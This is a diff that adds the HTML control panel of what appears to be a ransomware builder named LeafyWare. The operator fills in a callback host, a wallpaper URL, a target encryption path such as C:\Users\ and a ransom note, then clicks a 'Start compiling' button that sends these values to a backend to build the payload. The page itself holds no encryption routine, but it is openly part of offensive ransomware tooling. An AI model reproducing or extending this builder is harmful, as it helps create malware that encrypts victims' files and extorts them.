@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.2/darkly/bootstrap.min.css" integrity="sha384-nNK9n28pDUDDgIiIqZ/MiyO3F4/9vsMtReZK39klb/MtkZI3/LtjSjlmyVPS3KdN" crossorigin="anonymous">  
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>LeafyWare</title>
+</head>
+<body>
+<br>
+<div class="jumbotron card border-success mb-3">
+  <div class="container form-row">
+    <div class="container form-group col-md-7">
+        <div class="card border-success" style="max-width: 30rem;">
+            <div class="card-body row col-sm-9">
+                <h4 class="card-title text-danger">[✗]─[{{ user }}@{{ distro }}]</h4>
+                <br>
+                <p class="card-text text-success"> Leafyware v0.1 <br> Coded by script1337 <br> https://github.com/ScRiPt1337/LeafyWare </p>
+            </div>
+        </div>
+    </div>
+        <center>
+            <form>
+                <h1 class="display-6 text-success mx-auto"><strong>LeafyWare</strong></h1>
+                    <fieldset>
+                        <label class="text-success">Host website : </label>
+                        <input type="text" class="form-control-plaintext card border-success form-control-sm" id="hostwebsite" placeholder="http://yourhostwebsite.com:5000">
+                        <label class="text-success">Wallpaper Url: </label>
+                        <input type="text" class="form-control-plaintext card border-success form-control-sm" id="wallpaper" placeholder="http://yourwallpaper.com/wal.jpg">
+                </form>
+              <br>
+              <hr>
+            <button type="button" id="startattack" class="btn btn-outline-danger btn-sm" >Start compiling</button>
+        </center>
+</div>
+              <br>
+              <hr>
+<div class="container-fluid">
+<fieldset>
+  <label class="text-success">Encryption path : </label>
+  <input type="text" class="form-control-plaintext card border-success form-control-sm" id="encryptionpath" placeholder="C:\Users\">
+</fieldset>
+  <label class="text-success">Your ransom Note : </label>
+<div class="form-group">
+<textarea  rows="7" cols="50" class="form-control-plaintext card border-success" id="note" rows="3" spellcheck="false"></textarea>
+</div>
+</div>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js"></script>
+<script>
+
+  document.getElementById("startattack").addEventListener("click", function() {
+    socket.emit('startbuild', {
+      note: document.getElementById("note").value,
+      cryptpath: document.getElementById("encryptionpath").value,
+      host: document.getElementById("hostwebsite").value,
+      wallpaper: document.getElementById("wallpaper").value
+    });
+});
+
+</script>
+</html>
